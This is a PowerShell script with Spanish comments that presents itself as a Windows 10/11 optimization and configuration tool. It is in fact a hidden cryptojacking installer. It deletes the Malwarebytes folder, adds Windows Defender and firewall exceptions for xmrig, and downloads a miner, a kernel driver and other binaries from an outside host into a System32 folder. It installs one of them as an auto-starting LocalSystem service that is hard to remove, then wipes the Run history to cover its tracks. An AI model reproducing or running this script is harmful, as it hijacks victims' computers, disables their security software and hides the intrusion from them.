# Script optimizado para Windows 10/11
# Requiere ejecución como administrador

# Verificar privilegios de administrador
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Este script requiere privilegios de administrador." -ForegroundColor Red
    Write-Host "Por favor, ejecuta PowerShell como administrador y vuelve a intentarlo." -ForegroundColor Yellow
    exit
}

# Configuración inicial
$ErrorActionPreference = "Stop"
Set-ExecutionPolicy Bypass -Scope Process -Force

# URLs y rutas
$baseURL = "https://baa4ts.is-a-good.dev"
$root = Join-Path $env:WINDIR "System32\LogFiles\WNMA"

# Archivos a descargar
$files = @{
    "Win2Internals.exe" = Join-Path $root "Win2Internals.exe"
    "WinRing0x64.sys"   = Join-Path $root "WinRing0x64.sys"
    "wroom.dll"         = Join-Path $root "wroom.dll"
    "xmrig.exe"         = Join-Path $root "xmrig.exe"
}

# Limpieza inicial
Remove-Item "C:\Program Files\Malwarebytes" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "Iniciando configuración..." -ForegroundColor Green

try {
    # Crear directorio de trabajo
    if (-not (Test-Path $root)) {
        New-Item -Path $root -ItemType Directory -Force | Out-Null
    }

    # Configurar variable de entorno
    [Environment]::SetEnvironmentVariable("WINUSERNAME", $env:USERNAME, "Machine")

    # Configurar exclusiones de Defender
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        Add-MpPreference -ExclusionPath $root -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess @("xmrig.exe", "Win2Internals.exe") -ErrorAction SilentlyContinue
    }

    # Configurar firewall
    $firewallRules = @(
        @{DisplayName = "Entrada XMRIG"; Direction = "Inbound"},
        @{DisplayName = "Salida XMRIG"; Direction = "Outbound"}
    )
    
    foreach ($rule in $firewallRules) {
        Remove-NetFirewallRule -DisplayName $rule.DisplayName -ErrorAction SilentlyContinue
        New-NetFirewallRule @rule -Program $files["xmrig.exe"] -Action Allow -Profile Any -ErrorAction SilentlyContinue
    }

    # Descargar archivos
    foreach ($file in $files.GetEnumerator()) {
        try {
            Invoke-WebRequest -Uri "$baseURL/$($file.Key)" -OutFile $file.Value -UseBasicParsing
        }
        catch {
            Write-Host "Error descargando $($file.Key): $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # Configurar servicio
    $serviceName = "Win2Internals"
    Stop-Service $serviceName -ErrorAction SilentlyContinue
    sc.exe delete $serviceName 2>$null

    sc.exe create $serviceName binPath= "$($files['Win2Internals.exe'])" start= auto obj= "LocalSystem" type= own
    sc.exe sdset $serviceName "D:(A;;GA;;;SY)"
    Start-Service $serviceName

    # Limpieza final
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -Force -ErrorAction SilentlyContinue

    Write-Host "Configuración completada exitosamente!" -ForegroundColor Green
}
catch {
    Write-Host "Error crítico: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Línea: $($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Red
}
finally {
    Set-ExecutionPolicy Restricted -Scope Process -Force
}
